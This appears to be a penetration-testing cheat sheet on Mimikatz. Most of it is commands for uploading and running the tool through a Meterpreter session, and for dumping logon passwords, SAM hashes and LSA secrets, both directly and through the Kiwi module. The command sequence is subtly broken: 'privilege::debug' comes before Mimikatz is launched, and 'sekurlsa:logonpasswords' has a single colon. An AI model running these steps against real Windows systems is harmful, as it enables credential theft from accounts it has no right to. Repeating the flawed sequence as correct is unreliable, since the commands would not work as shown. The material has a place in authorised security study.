# Mimikatz

Mimikatz is a Windows post-exploitation tool that allows for the extraction of plaintext credentials form memory, password hashes from local SAM databases and more.

The Security Account Manager (SAM) database is a database file that stores users passwords and can be used to authenticate users both locally and remotely.

If we have access to a meterpreter session on a Windows target, we can use the inbuilt meterpreter module **Kiwi** which dynamically execute Mimikatz on the target system without touching the disk.

```bash
# Upload Mimikatz to a target system:
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe

# Open a command shell session
shell

# Check if we have the required permissions
privilege::debug

# Run the uploaded executable
.\mimikatz.exe

# Display logon passwords
sekurlsa:logonpasswords

# Dump SAM database
lsadump::sam

# Dump secrets, in some cases this could provide clear text credentials 
lsadump::secrets
```

## Kiwi usage

```bash
# Load Kiwi module
load kiwi

# Dump credentials
creds_all

# Dump the content of the SAM database
lsa_dump_sam

# Dump secrets, in some cases this could provide clear text credentials 
lsa_dump_secrets
```